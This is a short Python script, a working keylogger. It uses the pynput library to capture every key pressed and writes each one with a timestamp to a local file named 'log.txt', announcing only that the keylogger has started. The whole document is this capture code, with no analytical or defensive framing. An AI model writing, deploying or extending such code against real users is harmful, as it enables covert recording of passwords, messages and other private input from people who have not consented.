from pynput.keyboard import Key, Listener
import logging

# Set up the logger to save keystrokes to 'log.txt'
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    # Log the key that was pressed
    logging.info(str(key))

# Start the listener
with Listener(on_press=on_press) as listener:
    print("Keylogger started... (Press Ctrl+C to stop)")
    listener.join()